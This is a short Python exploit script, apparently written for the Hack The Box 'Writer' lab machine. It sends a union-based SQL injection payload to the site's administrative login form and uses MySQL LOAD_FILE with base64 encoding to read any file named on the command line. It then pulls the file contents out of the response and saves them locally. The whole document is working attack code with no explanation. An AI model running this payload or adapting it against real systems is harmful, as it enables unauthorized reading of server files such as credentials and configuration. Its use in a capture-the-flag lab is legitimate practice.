import requests
import sys
import re
import base64

## this line filters out the start and end of the response only gets the file content
regex = re.compile(r"admin(.*)</h3>", re.DOTALL)
## sqli payload
data = {"uname": f"admin' union select 1, TO_BASE64(LOAD_FILE(\"{sys.argv[1]}\")),3,4,5,6-- -", "password": "123"}

r = requests.post("http://writer.htb/administrative", data=data)
match = re.search(regex, r.text)

fname = sys.argv[1].replace("/", "_")[1:]

if match.group(1) != 'None':
    with open ('files/' + fname, 'w') as f:
        output = base64.b64decode(match.group(1) + '=' * (-len(match.group(1)) % 4))
        f.write(output.decode())
